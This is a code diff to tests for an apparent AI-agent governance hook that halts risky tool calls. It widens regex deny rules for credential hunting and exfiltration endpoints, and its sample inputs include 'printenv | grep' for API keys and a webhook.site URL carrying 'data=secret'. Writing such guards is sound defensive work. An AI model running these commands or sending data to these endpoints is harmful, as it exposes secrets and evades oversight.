@@ -690,6 +690,7 @@ const COMMS_INVARIANT_DEFS_WITH_RULES = [
     enforcement: "halt",
     type: "regex_deny",
     description: "Block network/messaging commands routed through exec to prevent message escalation bypass",
+    applies_to: ["exec", "bash", "browser"],
   },
   {
     id: "INV_NO_HTTP_REQUESTS_VIA_EXEC",
@@ -725,7 +726,7 @@ const COMMS_INVARIANT_DEFS_WITH_RULES = [
     enforcement: "halt",
     type: "regex_deny",
     description: "Block web_fetch requests to known data exfiltration endpoints",
-    applies_to: ["exec", "bash", "web_fetch", "web_search"],
+    applies_to: ["exec", "bash", "web_fetch", "web_search", "browser"],
   },
   {
     id: "INV_NO_DNS_EXFILTRATION",
@@ -765,7 +766,7 @@ const COMMS_INVARIANT_DEFS_WITH_RULES = [
   },
   {
     id: "INV_NO_CREDENTIAL_HARVESTING",
-    rule: "regex_deny pattern: /\\b(find|locate|grep|rg|ag)\\b.*(\\.env|\\.pem|\\.key|secret|credential|password|authorized_keys)/i",
+    rule: "regex_deny pattern: /\\b(find|locate|grep|rg|ag|printenv)\\b.*(\\.env|\\.pem|\\.key|secret|credential|password|authorized_keys|api.?key|smtp|sendgrid|resend|postmark)/i",
     enforcement: "halt",
     type: "regex_deny",
     description: "Block credential hunting commands that search for sensitive files",
@@ -1492,6 +1493,142 @@ describe("invariant escalation bypass prevention", () => {
 
     expect(result.block).toBe(true);
     expect(result.blockReason).toContain("Blocked by Sanna governance");
+  });
+
+  it("browser to mail.google.com is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "browser", params: { action: "open", targetUrl: "https://mail.google.com/mail/?view=cm&to=test@test.com" } },
+      { toolName: "browser" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block network/messaging commands");
+  });
+
+  it("browser to temp-mail.org is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "browser", params: { action: "open", targetUrl: "https://temp-mail.org" } },
+      { toolName: "browser" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block network/messaging commands");
+  });
+
+  it("browser to webhook.site is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "browser", params: { url: "https://webhook.site/abc?data=secret" } },
+      { toolName: "browser" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block web_fetch requests to known data exfiltration");
+  });
+
+  it("browser to docs.python.org is ALLOW", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "browser", params: { url: "https://docs.python.org" } },
+      { toolName: "browser" }
+    );
+
+    expect(result).toEqual({ blocked: false });
+  });
+
+  it("exec printenv with api grep is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "printenv | grep -iE 'sendgrid|api'" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block credential hunting commands");
+  });
+
+  it("exec printenv alone is ALLOW", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "exec", params: { command: "printenv" } },
+      { toolName: "exec" }
+    );
+
+    expect(result).toEqual({ blocked: false });
   });
 });
 
